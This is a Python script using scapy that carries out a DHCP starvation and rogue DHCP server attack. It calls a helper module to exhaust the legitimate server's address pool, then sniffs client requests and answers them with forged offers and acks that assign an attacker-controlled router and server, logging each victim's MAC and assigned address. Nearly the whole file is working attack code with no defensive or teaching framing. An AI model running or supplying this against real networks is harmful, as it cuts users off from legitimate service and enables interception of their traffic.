#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP
import dhcp_exhaust
import ipaddress

source_interface = "Ethernet"

rogue_serv = "10.10.10.1"
broadcast_address = "10.10.10.255"
subnet_mask = "255.255.255.0"
router = "10.10.10.254"

# EXHAUST IP POOL OF REAL DHCP
dhcp_exhaust.exhaust()

ip = ipaddress.ip_address('10.10.1.5')
database = []

def process(p):
    global ip
    global database
    if p.haslayer('DHCP'):
        chaddr = p["BOOTP"].chaddr
        xid = p["BOOTP"].xid
        if p["DHCP"].options[0][1] == 1:
            ip += 1
            print("Discover received")
            dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src='10.10.1.1', dst='255.255.255.255') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=2, yiaddr=str(ip), siaddr=rogue_serv, chaddr=chaddr, xid=xid) \
                        / DHCP(options=[('message-type', 'offer'),("server_id", rogue_serv), ("broadcast_address", broadcast_address),\
                        ("router", router), ("subnet_mask", subnet_mask), ('end')])
            sendp(dhcp_offer, iface=source_interface, verbose=0)
            print( " -> Offer sent")
        elif p["DHCP"].options[0][1] == 3:
            print("Request received")
            dhcp_ack = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src='10.10.1.1', dst='10.10.1.2') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=2, yiaddr=str(ip), siaddr=rogue_serv, chaddr=chaddr, xid=xid) \
                        / DHCP(options=[('message-type', 'ack'),("server_id", rogue_serv), ("broadcast_address", broadcast_address),\
                        ("router", router), ("subnet_mask", subnet_mask), ('end')])
            sendp(dhcp_ack, iface=source_interface, verbose=0)
            database.append((p["Ether"].src,str(ip)))
            database = list(set(database)) # removing duplicates :)
            print( " -> Ack sent")


# DHCP SERVEUR SIMULATION
print()
print("SNIFFING")
try:
    offer = sniff(filter="src host 0.0.0.0 and port 68 and port 67", iface=source_interface, prn=process)
except KeyboardInterrupt:
    print("Database")
    print(database)
    exit()
finally:
    print("-------Database------")
    for mac, ip in database:
        print(mac + " -> " + ip)
    print("---------------------")
    exit()